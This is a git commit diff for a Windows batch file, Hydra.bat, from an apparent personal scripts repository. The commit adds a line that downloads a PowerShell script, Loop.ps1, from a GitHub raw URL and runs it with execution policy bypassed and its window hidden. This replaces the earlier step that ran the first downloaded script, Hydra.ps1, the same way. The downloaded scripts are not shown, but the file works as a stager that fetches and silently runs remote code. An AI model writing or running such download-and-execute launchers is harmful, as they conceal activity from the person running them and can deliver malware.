071bcb72c78a3558354b6e258e061677b068c072
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-08-22 22:29:14 +0800

    Update Hydra.bat

--- Hydra/Hydra.bat
+++ Hydra/Hydra.bat
@@ -1,2 +1,3 @@
 Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Hydra/Hydra.ps1 -OutFile .\Hydra.ps1
-powershell -ExecutionPolicy Bypass -File Hydra.ps1 -windowstyle hidden
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Hydra/Loop.ps1 -OutFile .\Loop.ps1
+powershell -ExecutionPolicy Bypass -File Loop.ps1 -windowstyle hidden
